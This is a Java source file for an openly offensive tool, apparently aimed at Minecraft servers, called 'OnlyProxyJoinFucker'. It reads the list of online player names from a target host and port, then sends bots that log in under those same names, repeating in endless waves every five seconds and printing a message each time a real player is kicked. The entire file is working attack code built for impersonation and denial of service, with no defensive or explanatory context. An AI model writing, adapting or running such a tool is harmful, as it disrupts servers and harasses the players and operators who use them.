package de.febanhd.onlyproxyjoinfucker;

import com.google.common.collect.ImmutableList;
import de.febanhd.fbot.BotFactory;
import de.febanhd.fbot.bot.FBot;
import de.febanhd.onlyproxyjoinfucker.utils.PingUtil;
import joptsimple.OptionParser;
import joptsimple.OptionSet;
import joptsimple.OptionSpec;

import java.io.IOException;

public class OnlyProxyJoinFucker {

    public static void main(String[] args) {
        OptionParser optionParser = new OptionParser();

        OptionSpec<Void> help = optionParser
                .acceptsAll(ImmutableList.of("help"), "show help menu")
                .forHelp();

        OptionSpec<String> hostOption = optionParser
                .acceptsAll(ImmutableList.of("h", "host"), "the host of the server")
                .withRequiredArg()
                .required()
                .ofType(String.class);
        OptionSpec<Integer> portOption = optionParser
                .acceptsAll(ImmutableList.of("p", "port"), "the port of the server")
                .withRequiredArg()
                .required()
                .ofType(Integer.class);

        try {
            OptionSet options = optionParser.parse(args);

            if(options.has(help)) {
                optionParser.printHelpOn(System.out);
                return;
            }
            String host = hostOption.value(options);
            int port = portOption.value(options);

            new OnlyProxyJoinFucker(host, port);
        }catch (Exception e) {
            e.printStackTrace();
            System.exit(-1);
        }
    }

    private int wave = 0;
    private final String host;
    private final int port;

    public OnlyProxyJoinFucker(String host, int port) throws IOException, InterruptedException {
        this.host = host;
        this.port = port;

        System.out.println("Starting Only Proxy Join Fucker on " + host + ":" + port);

        while(true) {
            this.wave++;
            System.out.println("Starting wave #" + this.wave);
            for (String playerName : PingUtil.getPlayerNames(this.host, this.port)) {
                FBot bot = BotFactory.createBot(playerName);
                bot.connect(this.host, this.port, () -> {
                    System.out.println(playerName + " was kicked :)");
                    bot.disconnect();
                });
            }
            Thread.sleep(5000);
        }
    }
}
